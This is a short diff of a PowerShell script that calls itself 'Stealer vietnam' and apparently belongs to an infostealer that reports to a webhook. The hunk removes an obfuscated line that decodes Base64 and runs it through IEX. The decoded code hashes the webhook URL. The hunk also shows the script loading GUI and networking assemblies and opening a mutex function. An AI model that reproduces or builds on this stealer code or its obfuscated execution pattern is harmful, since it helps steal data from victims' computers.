@@ -16,9 +16,7 @@ else {
 
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 $namestealer = "Stealer vietnam"
-IEX([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("JGhhc2hQcm92aWRlciA9IFtTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlNIQTI1Nl06OkNyZWF0ZSgpCiRieXRlQXJyYXkgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCR3ZWJob29rKQokaGFzaCA9ICRoYXNoUHJvdmlkZXIuQ29tcHV0ZUhhc2goJGJ5dGVBcnJheSkKJHdlYmhvb2toYXNoU3RyaW5nID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkaGFzaCkgLXJlcGxhY2UgJy0nLCAnJw==")))
 
-# Load WPF assemblies
 Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
 
 function KDMUTEX {
